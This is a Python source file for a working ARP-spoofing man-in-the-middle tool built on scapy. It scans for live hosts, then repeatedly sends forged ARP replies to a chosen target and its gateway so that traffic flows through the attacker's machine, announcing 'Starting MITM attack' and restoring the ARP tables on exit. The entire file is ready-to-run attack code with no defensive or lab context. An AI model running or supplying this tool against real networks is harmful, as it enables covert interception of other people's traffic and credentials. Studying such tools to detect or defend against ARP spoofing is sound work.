### Libs
import scapy.all as scapy
import time
import optparse
import socket
import os

### Global variables
global options
global target_ip
global gateway_ip

### Return a list of valid alive network neighbors 
def get_hosts(ip): 

    ### Create an ARP packet with desired IP
    arp_request = scapy.ARP(pdst=ip)
    
    ### Create a braodcast packet sent to broadcast address
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")    
    
    ### Combine both variable to build a the complete packet
    arp_resquest_broadcast = broadcast/arp_request
    
    ### Set a variable with results
    answered_list  = scapy.srp(arp_resquest_broadcast, timeout=1, verbose=False)[0]
    
    ## Create empty list to store client mac-ip value
    client_list = []
    
    ### Add value as dictionnarie in client_list
    for element in answered_list:
        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        client_list.append(client_dict)
    
    ### Return a list of dictionnary with IP and MAC
    ip_list = []
    for ip_address in client_list:
        ip_list.append(ip_address['ip'])
    return ip_list

### Deal with arguments passed in
def get_arguments():
    
    ### Set a parser object
    parser = optparse.OptionParser()
    
    ### Define options and their help message
    parser.add_option("-t", "--target", dest="target", help="Type the ipv4 target address")
    parser.add_option("-g", "--gateway", dest="gateway", help="Type the ipv4 gateway address")
    
    ### Set options enter by the user to variables
    options = parser.parse_args()[0]
    
    ### Perform verification on user input
    if not options.target:
        parser.error("[*] - Please specify a target ip, use --help for more info")
    elif not options.gateway:
        parser.error("[*] - Please specify the gateway ip, use --help for more info")       
    
    ### If no error found, return user input options
    return options

### Resolve mac address for the ip passed in
def get_mac(ip):
    
    ### Create an ARP packet with desired IP
    arp_request = scapy.ARP(pdst=ip)
    
    ### Create a braodcast packet sent to broadcast address
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")    
    
    ### Combine both variable to build a the complete packet
    arp_resquest_broadcast = broadcast/arp_request
    
    ### Set a variable with results
    answered_list  = scapy.srp(arp_resquest_broadcast, timeout=1, verbose=False)[0]
    
    ### Create empty list to store client mac-ip value
    return answered_list[0][1].hwsrc

### Send ARP response packet
def spoof(target_ip, spoof_ip):
    
    ### Set a variable with mac address of victim's ip
    target_mac = get_mac(target_ip)
    
    ### Create an ARP response packet
    packet = scapy.ARP(op=2,pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    
    ### Send the packet to victim chost
    scapy.send(packet,verbose=False)

### Restore ARP tables
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


if __name__ == '__main__':

    ### Set variable with target and gateway ip address values
    options = get_arguments()
    target_ip = options.target
    gateway_ip = options.gateway
    
    ### Show to the user start message and set number of sent packet to 0
    sent_packets_count = 0
    print("[+] - Starting MITM attack, press CTRL+C to stop")

    ### Send arp response packet every 2 seconds until stoped by CTRL+C
    try:
        while True:
            
            ### Vitcim packet
            spoof(target_ip, gateway_ip)
            
            ### Gateway packet
            spoof(gateway_ip, target_ip)
            
            ### Print output for the user
            print("\r[+] - ARP response Packets sent - " + str(sent_packets_count), end =""),
            ###sys.stdout.flush()
            ###increment variable every time loop run
            sent_packets_count = sent_packets_count + 2 
            ### Wait two second
            time.sleep(2)
    except KeyboardInterrupt:
        print('\n[-] - CTRL+C detected, resetting ARP tables and stopping the attack')
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
